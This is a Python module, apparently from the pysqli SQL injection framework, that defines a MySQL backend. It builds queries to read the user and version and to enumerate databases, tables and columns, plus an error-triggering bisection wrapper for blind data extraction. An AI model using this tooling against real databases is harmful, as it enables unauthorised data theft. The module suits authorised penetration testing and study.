#-*- coding:utf-8 -*-

from pysqli.core.dbms import COMMENT, DBS_ENUM, TABLES_ENUM,\
    COLS_ENUM, FIELDS_ENUM, STR, allow, DBMS, dbms
from pysqli.core.forge import SQLForge

class MysqlForge(SQLForge):
    def __init__(self, context):
        SQLForge.__init__(self, context)

    ###
    #Define overrides
    ###

    def get_user(self):
        return 'USER()'

    def get_version(self):
        """
        Mysql specific macro
        """
        return "@@VERSION"

    def get_databases(self):
        """
        List databases
        """
        return "SELECT schema_name FROM information_schema.schemata"

    def get_tables(self, db):
        """
        List databases given a specific database
        """
        return "SELECT table_name FROM information_schema.tables WHERE table_schema=%s" % self.wrap_string(db)

    def get_fields(self, table, db):
        """
        Retrieve fields given a specific table and database
        """
        return "SELECT column_name FROM information_schema.columns WHERE table_schema=%s AND table_name=%s" % (
        self.wrap_string(db), self.wrap_string(table))

    def wrap_bisec(self, cdt):
        """
        This method must trigger an error on FALSE statement (Basic engine inner working)
        """
        return self.wrap_sql("SELECT IF(%s,%s,(SELECT %s UNION ALL SELECT %s ))" % (
        cdt, self.wrap_field('0'), self.wrap_field('0'), self.wrap_field('0')))


@dbms('mysqlv5', 'Mysql version 5')
@allow(DBS_ENUM | TABLES_ENUM | COLS_ENUM | FIELDS_ENUM | COMMENT | STR)
class Mysql5(DBMS):
    def __init__(self, injector, limit_count_max=500):
        DBMS.__init__(self, MysqlForge, injector, limit_count_max)
